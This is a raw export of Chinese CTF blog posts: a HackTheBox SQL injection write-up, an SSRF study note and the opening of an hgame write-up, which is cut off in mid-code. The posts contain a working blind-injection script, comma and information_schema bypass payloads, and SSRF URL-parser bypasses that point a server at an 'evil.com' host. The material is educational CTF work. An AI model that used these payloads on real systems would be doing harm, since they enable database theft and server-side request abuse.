base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">url += payload</span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">print(body)</span><br></pre></td></tr></table></figure><p>于是通过FUZZ，发现存在不少过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">，</span><br><span class="line">concat</span><br><span class="line">information_schema.tables</span><br><span class="line">where</span><br><span class="line">limit</span><br></pre></td></tr></table></figure><p>而且以上过滤都是正则匹配，没法用招数绕过，只能找替代。<br>首先<code>order by</code>用<code>group by</code>代替，这点不难。得到字段数为2。逗号过滤就比较局限了，这意味着我们要么使用盲注，要么使用<code>join</code>注入。<code>information_schema.tables</code>在之前的swpuweb1中也见到过了，肯定存在对应的替代表可以让我们获取表名。但是<code>where, concat,limit</code>不太好解决。(其实到最后才发现，不需要应对这几个过滤)其中<code>concat</code>也许可以用<code>make_set()</code>起到连接字符串的效果。但是<code>make_set()</code>需要至少两个参数，也必须要逗号；而<code>where</code>等等过滤也不好办。</p><p>总之先从简单的开始吧，我选择使用盲注爆出数据库名与版本号。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>, <span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://docker.hackthebox.eu:32614/index.php?obj="</span> <span class="comment">#10.3.20-MariaDB</span></span><br><span class="line">        payload = <span class="string">"1' and ascii(substr((select database()) from "</span>+str(i)+<span class="string">" for 1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">        url += payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Good'</span> <span class="keyword">in</span> body:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>由于不需要绕其他过滤，只需要用<code>select case from {0} for 1</code>代替<code>substr(case,{0},1)</code>。然而盲注脚本只能解决这两个问题，得不到表名，而且还贼慢，我只能另寻其他方法注入表名。</p><p>考虑到逗号过滤时另一种方法，<code>join</code>注入，我们根据确认的两个<br>字段数构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot;</span><br></pre></td></tr></table></figure><p>结果出乎我意料之外，回显出现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2</span><br></pre></td></tr></table></figure><p>也就是说第二个字段有回显……所以其实不需要盲注，直接根据回显union select做就好了。<br>所以下一步准备拿到表名，这里在我始终纠结于无法使用<code>group_concat()</code>要怎么拿到全部数据时，师傅的提示让我注意到了这里的报错函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 34</span><br></pre></td></tr></table></figure><p>这里的sql注入是通过<code>mysqli_fetch_assoc()</code>达成的，其返回值为：返回代表读取行的关联数组。所以不需要concat，也可以得到一行注入得到的全部数据。<br>所以注入表名就不再担心那些问题，只要把<code>information_schema.tables</code>的代替找到就好(由于之前注入过版本，确认是10.3.20，可以用<code>mysql.innodb_table_stats</code>代替)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot;</span><br></pre></td></tr></table></figure><p>得到表名的连接字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATAFlagTableUnguessableEzPZgtid_slave_pos</span><br></pre></td></tr></table></figure><p>接下来由于<code>information_schema.columns</code>找不到替代方式，看来是跟swpu一样的无列名注入了。之前文章里也写过，而此处的无列名注入稍有区别，属于未过滤<code>`</code>反引号，过滤掉逗号的情况。所以模板是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39; union select * from (select 1)a join (select &#96;2&#96; from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;表名&#39;)i )b #</span><br></pre></td></tr></table></figure><p>实际上这道题目与第五届上海市大学生网络安全大赛 easysql十分相像，因此可以作为参考。<br>下面一步就是要猜字段数跟表名了，首先判断表名，上网搜下发现<code>mysql.gtid_slave_pos</code>是一种系统表，所以估计最后一部分 <code>gtid_slave_pos</code>是一张表。之后按照这个模板不变，只改表名，发现<code>Data</code>是一张表。且内容就是我们之前回显的sql注入提示的内容，故刚好2个字段。<br>那么估计flag就在<code>FlagTableUnguessableEzPZ</code>这张表了，而且猜测一张有flag表只有一列，所以改成一个字段试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"' UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from  FlagTableUnguessableEzPZ)x )n#"</span></span><br></pre></td></tr></table></figure><p>成功拿到flag。</p><p>总结下吧，这算是一道很有营养的题目了。如果能根据报错发现后面的sql注入，就算跨过了一大步，这些主要是对php特性的理解。而我在sql注入这一步上倒是也卡了好久……不过题目很好的帮我再一次复习了无列名注入这个有意思的知识点，以及<code>join</code>绕过逗号这一经典方法。看来可以作为bypass<code>information_schema</code>的常规武器使用了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记-SSRF基础</title>
      <link href="2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/"/>
      <url>2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>终于准备把欠了好久的SSRF学习记录一下了。最早接触SSRF是去年暑假，师傅给了我一道郁离歌出的入群题。当时对SSRF一无所知，东拼西凑才得到一个ip。可惜当时不知道是内网ip,最后涉及一个gopher打mysql的常见类型，最后也没能做出来。那之后也没有仔细做过ssrf题目，那我现在就来记录一下ssrf的学习笔记吧。</p><a id="more"></a><h1 id="1-SSRF"><a href="#1-SSRF" class="headerlink" title="1. SSRF"></a>1. SSRF</h1><p>  ssrf全称为Server-side Request Forgery，即服务端请求伪造攻击。很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p>也就是说，ssrf的漏洞点在于：<strong>服务端提供了从其他服务器应用获取数据的功能，在用户可控的情况下，未对目标地址进行过滤与限制</strong>.<br>常见场景包括但不仅限于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line">4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line">#比如hgameweek2</span><br><span class="line">5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>如果要从服务端的源码层面来讲，主要就是以下三种函数(php)：</p><p><strong>1.file_get_contents()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">$filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span><br><span class="line">file_put_contents($filename, $content); </span><br><span class="line"><span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span><br><span class="line">$img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> $img; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>常见的直接用<code>file_get_contents()</code>加载url指向文件<br><strong>2.fsockopen()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">$out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"\r\n"</span>; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=<span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">return</span> $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><p><strong>3.curl_exec()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假如出现以上几种函数（已知源码前提下），通常可以尝试使用ssrf。</p><h1 id="2-SSRF的利用"><a href="#2-SSRF的利用" class="headerlink" title="2.SSRF的利用"></a>2.SSRF的利用</h1><p>实话说，ssrf不像sql，xss那样属于人尽皆知的漏洞。但其利用在真实渗透中是非常常见的。其利用场景主要有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.让服务端去访问相应的网址</span><br><span class="line">(比如读&#x2F;flag之类的)</span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line">3.可以使用&#96;&#96;&#96;file、dict、gopher、ftp&#96;&#96;&#96;协议进行请求访问相应的文件</span><br><span class="line">(其中gopher被称作万金油，可以打内网也可以get,post,当然还有攻击内网未授权的mysql，主要区别在于不默认端口)</span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line">(ssrf打redis)</span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有**端口开放**</span><br><span class="line">7.利用phar协议触发反序列化</span><br></pre></td></tr></table></figure><p>CTF题目中具体见过的包括之前hackergame的一道伪ssrf（只涉及到url）；NCTF2019 True-XML-Cookbook<br>以及hgame的Cosmos的博客后台（果然还是做得太少了）</p><h1 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h1><p>关于绕过，把重点放在几个大类上：<br> 1）ip地址绕过<br>对<code>192.168.0.1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8进制：0300.0250.0.1</span><br><span class="line">16进制：0xC0.0xA8.0.1</span><br><span class="line">10进####制：3232235521</span><br><span class="line">16进制整数: 0xC0A80001</span><br></pre></td></tr></table></figure><p>也可以通过省略达到同样的效果<br>对10.0.0.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.http:&#x2F;&#x2F;0&#x2F;</span><br><span class="line">2.http:&#x2F;&#x2F;127.1&#x2F;</span><br><span class="line">3.ipv6:http:&#x2F;&#x2F;[::1]&#x2F;</span><br><span class="line">4.http:&#x2F;&#x2F;127.0.0.1.&#x2F;</span><br></pre></td></tr></table></figure><h4 id="2-url-bypass"><a href="#2-url-bypass" class="headerlink" title="2)url bypass"></a>2)url bypass</h4><p>这应该是是基础类ssrf最常见的考点了，比较适合我这样的萌新总结。<br>在谈及绕过之前，先来理解下url的基本概念：<br><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/1.jpg" alt="url"><br>可以注意到url的组成部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scheme 协议</span><br><span class="line">authority 权限&#x3D;主机名+端口号 ，再详细一点如</span><br><span class="line">![2.jpg](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;18060177-6d443ccaaa9138ba.jpg?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)</span><br><span class="line">admin:admin@www.example.com:2333&#96;（使用用户名为 admin，密码为 admin，访问 www.example.com 的 2333 端口获取资源）</span><br><span class="line">path 路径</span><br><span class="line">query 查询</span><br><span class="line">fragment 指向一个更低级别的资源</span><br></pre></td></tr></table></figure><p>我们常常通过构造url来bypass个别函数，最终达成ssrf的目的。<br>而orange的那篇经典的pdf指出了几个函数利用上的经典漏洞，其中离不开一个<code>@</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br></pre></td></tr></table></figure><p><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/2.jpg" alt="parse_url"><br>利用<code>@</code>可以轻松使google.com（默认白名单）置为host，达到绕过php parse_url的效果（这里用#将@忽略了）</p><p>同样对于curl操作，假如使用libcurl<br><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/3.jpg" alt="lib_curl"><br>则将第一个<code>@</code>后的危险网站置为执行curl的对象，达到漏洞利用。<br>同样效果的还有<code>;</code><br>即<code>http://evil.com;google.com</code>。curl会将<code>evil.com</code>当成<br>hostname,而将后面的<code>google.com</code>当做quqerystring。</p><p>提到curl,还可以提到后端代码的一种常见搭配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.filter_var对url进行check</span><br><span class="line">2.parse_url获取url的host</span><br><span class="line">3.对host进行正则匹配</span><br><span class="line">4.exec执行命令</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关于bypass <code>filter_var</code>及<code>parse_url</code>也是有妙招的：<br>首先是 <code>filter_var</code>：<br>上面说到，<code>http://evil.com;google.com</code>是可以执行curl到危险网站的。但是假如在curl之前加上<code>filter_var</code>后要怎么绕过呢？很简单，更改协议即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil.com;google.com</span><br></pre></td></tr></table></figure><p>但是这样的话curl可能执行不了了，所以把hostname强调一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil.com:80;google.com:80</span><br></pre></td></tr></table></figure><p>加上端口即可。</p><p>其次是parse_url：<br>pase_url并不需要完全绕过hostname。因为parse_url的作用只是将一个给定url分成上面提到的<code>scheme,hostname，port,path</code>几部分。所以下面这个paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:&#x2F;&#x2F;evil$google.com</span><br></pre></td></tr></table></figure><p>在经过<code>parse_url</code>后，<code>hostname</code>仍为evil$google.com。但是当源码中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);</span><br></pre></td></tr></table></figure><p>执行时，bash会将后面的<code>$google.com</code>当做一个变量并置为空，所以<code>exec()</code>时仍是指向<code>evil.com</code><br>使用前提：用<code>exec system</code>执行<code>curl  wget</code>之类的。</p><p>以上都是curl函数的ssrf，那么如果是<code>file_get_contents()</code>呢：<br>比如只将上面<code>exec()</code>部分函数改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; get page from URL</span><br><span class="line">$a &#x3D; file_get_contents($argv[1]);</span><br></pre></td></tr></table></figure><p>这时就可以考虑到常常利用的各种协议,比如data协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;google.com&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">I love PHP</span><br></pre></td></tr></table></figure><p>所以如果把后面的base64部分换作xss代码编码后的结果，就可以执行xss。</p><p>先这样。由于还没接触到ssrf的高级拓展场景，等日后接触到再写一篇高级利用。</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p><p><a href="https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电hgame-week3</title>
      <link href="2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/"/>
      <url>2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/</url>
      
        <content type="html"><![CDATA[<p>  week3的难度更上一层楼。果不其然ak掉web的flag倒了，最后还是差一道题(其实是因为xss花了太多时间没做出来自闭了不想做了)总而言之收获不小，也头一次感受到高手切磋的意思。下个week估计不会再花这么多时间做题了。干脆写下欠着的笔记以及其他事吧。</p><a id="more"></a><h1 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h1><p>其实这道反序列化应该是出给这个week的签到题，可惜自己太菜了……反序列化果然还是要好好研究一下啊。好在最后还是做出来了，而且还体会到不少反序列化的趣味性。看来是应该好好研究一番了：<br>首先源码提示source.zip,我们看下源码中有用的部分：<br>game.php(略掉无用部分)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">'cardinal.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'player'</span>]))&#123;</span><br><span class="line">        $playerName = $_SESSION[<span class="string">'player'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $playerName = $_POST[<span class="string">'player'</span>] ?? <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>($playerName === <span class="string">''</span> || is_array($playerName))&#123;</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $game = <span class="keyword">new</span> Game($playerName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">当前排名: <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;rank-&gt;Get());<span class="meta">?&gt;</span></span><br><span class="line">      经验: <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($_SESSION[<span class="string">'exp'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;welcomeMsg);<span class="meta">?&gt;</span></span><br><span class="line">     <span class="meta">&lt;?php</span> <span class="keyword">echo</span>($game-&gt;rank-&gt;Get());<span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line">hgame&#123;flag_is_here&#125;</span><br></pre></td></tr></table></figure><p>cardinal.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 